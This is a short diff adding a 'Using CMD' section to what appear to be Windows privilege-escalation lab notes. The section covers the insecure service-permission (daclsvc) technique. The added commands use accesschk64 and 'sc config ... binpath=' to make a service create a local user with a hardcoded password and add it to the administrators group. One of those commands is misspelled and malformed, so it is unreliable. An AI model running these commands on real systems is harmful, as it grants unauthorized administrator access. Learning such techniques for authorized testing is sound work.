@@ -46,7 +46,25 @@ Next, check user John added with permissions Administrator.
 
 > net user
 
+#### Using CMD 
 
+> accesschk64.exe -wuvcq user *
+
+> sc config daclsvc binpath= "net user anakein pass1234 /add"
+
+> sc stop daclsvc
+
+> sc start daclsvc
+
+> sc config daclsvc binpath= "net user localgroup administradors anakein /add"
+
+Start service
+
+> sc start daclsvc
+
+List users in administrators group
+
+> net localgroup administrators
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
